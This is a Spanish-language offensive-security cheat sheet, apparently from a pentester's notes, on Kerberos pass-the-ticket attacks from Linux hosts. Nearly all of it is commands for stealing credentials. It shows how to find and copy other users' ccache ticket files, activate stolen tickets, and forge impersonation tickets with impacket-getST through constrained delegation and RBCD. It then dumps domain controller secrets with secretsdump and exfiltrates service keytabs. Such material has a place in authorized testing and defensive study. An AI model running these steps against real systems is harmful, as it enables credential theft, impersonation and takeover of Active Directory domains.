---
aliases:
  - PtT Linux
  - ccache theft
  - Kerberos Linux
tags:
  - technique/credential-access
  - env/linux
  - asset/active-directory
  - cred/kerberos
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Pass-the-Ticket]]"
---
# Pass-the-Ticket - Linux Extraction

***

## ccache Locations

| **Path** | **Owner** | **Cuándo existe** |
|:---:|:---:|:---:|
| `/tmp/krb5cc_<UID>` | User con UID | Host AD-joined (SSSD/realmd). |
| `/tmp/krb5cc_<random>` | SSSD-managed | SSSD config. |
| `$KRB5CCNAME` | Variable de entorno | Session activa. |
| `/run/user/<UID>/krb5cc` | Systemd-based | Algunos distros modernos. |
| `/var/lib/sss/db/ccache_*` | SSSD cache | SSSD persistente. |
^ptt-linux-locations

```bash
# Encontrar todos los ccache
ls /tmp/krb5cc_* 2>/dev/null
find /tmp -name "krb5cc_*" 2>/dev/null
env | grep KRB5CCNAME

# Ver si host está AD-joined
realm list 2>/dev/null
id $(whoami)  # ¿tiene grupos de AD?
```

___

## Robar ccache desde disco

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `cp /tmp/krb5cc_1000 /tmp/stolen.ccache` | Copia del TGT del UID 1000 | Con read access al archivo. |
| `export KRB5CCNAME=/tmp/stolen.ccache` | Activar el ticket robado | Post-copy. |
| `klist` | Verificar contenido del ticket | Confirmar identidad. |
| `impacket-ticketConverter /tmp/krb5cc_1000 out.kirbi` | Convertir a .kirbi | Para transferir a Windows. |
^ptt-linux-steal

```bash
# Robar TGT de usuario AD en Linux
sudo cp /tmp/krb5cc_1000 /tmp/stolen.ccache
export KRB5CCNAME=/tmp/stolen.ccache
klist
# Si el user tiene DA perms:
impacket-secretsdump -k -no-pass corp.local/admin@dc01.corp.local
```

___

## KRB5CCNAME — activar ccache

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `export KRB5CCNAME=/path/ticket.ccache` | Activa ccache para tools en sesión | Pre-uso con impacket. |
| `export KRB5CCNAME=FILE:/path/ticket.ccache` | Forma explícita con tipo | Equivalente. |
| `KRB5CCNAME=/path/ticket.ccache impacket-psexec ...` | Inline para un comando | Sin exportar. |
| `unset KRB5CCNAME` | Desactivar | Cleanup. |
^ptt-linux-krb5

```bash
# Flujo típico post-getST
impacket-getST -spn cifs/target.corp.local -impersonate administrator corp.local/svc:'P@ss'
# → genera administrator@cifs_target.corp.local.ccache

export KRB5CCNAME=administrator@cifs_target.corp.local.ccache
klist
impacket-psexec -k -no-pass corp.local/administrator@target.corp.local
```

___

## impacket-getST (generar ticket remotamente)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-getST -spn cifs/target -impersonate admin domain/svc:pass` | TGS impersonando admin via S4U | Constrained delegation / RBCD. |
| `impacket-getST -spn cifs/target -impersonate admin -hashes :NT domain/svc` | Idem con hash | Sin password. |
| `impacket-getST -spn cifs/target -impersonate admin -aesKey AESKEY domain/svc` | Con AES key | OPSEC mejor. |
| `impacket-getTGT domain/user:pass` | TGT directo | Pre-getST o impersonation. |
^ptt-linux-getst

```bash
# RBCD / constrained delegation abuse
impacket-getST \
  -spn cifs/dc01.corp.local \
  -impersonate administrator \
  corp.local/fakemachine\$:'P@ssw0rd'

export KRB5CCNAME=administrator@cifs_dc01.corp.local.ccache
impacket-secretsdump -k -no-pass -just-dc corp.local/administrator@dc01.corp.local
```

___

## kinit (generar TGT desde password)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `kinit user@CORP.LOCAL` | Solicita TGT (prompts password) | Kerberos auth legítima. |
| `echo 'password' \| kinit user@CORP.LOCAL` | Sin prompt (scripting) | Automation. |
| `kinit -kt /path/service.keytab svc@CORP.LOCAL` | TGT desde keytab file | Service accounts. |
| `klist` | Verificar TGT generado | Post-kinit. |
^ptt-linux-kinit

```bash
# Obtener TGT con credenciales
kinit administrator@CORP.LOCAL
# Enter password: ****

klist
# Credentials cache: FILE:/tmp/krb5cc_1000
# Default principal: administrator@CORP.LOCAL
# Valid starting Expires Service principal
# 05/03/26 ... krbtgt/CORP.LOCAL@CORP.LOCAL

# Usar con impacket
impacket-smbclient -k -no-pass corp.local/administrator@dc01.corp.local
```

___

## SSSD / realmd — hosts AD-joined

| **Concepto** | **Detalle** | **Cuándo** |
|:---:|:---:|:---:|
| Host AD-joined con realmd | SSSD gestiona auth + ccache | Linux servers en dominio. |
| ccache location SSSD | `/tmp/krb5cc_<UID>` o `/var/lib/sss/db/ccache_<DOMAIN>` | Depende de config. |
| Obtener ccache activo de otro user | Requiere leer `/tmp/krb5cc_<UID>` del target user | Root o mismo user. |
| Service keytabs | `/etc/krb5.keytab` o `/etc/sssd/*.keytab` | Exfil → kinit -kt. |
^ptt-linux-sssd

```bash
# En host AD-joined comprometido — exfiltrar keytab
ls /etc/krb5.keytab /etc/sssd/*.keytab 2>/dev/null
cp /etc/krb5.keytab /tmp/stolen.keytab

# Usar keytab para obtener TGT del service account
kinit -kt stolen.keytab host/hostname@CORP.LOCAL
klist
```

***
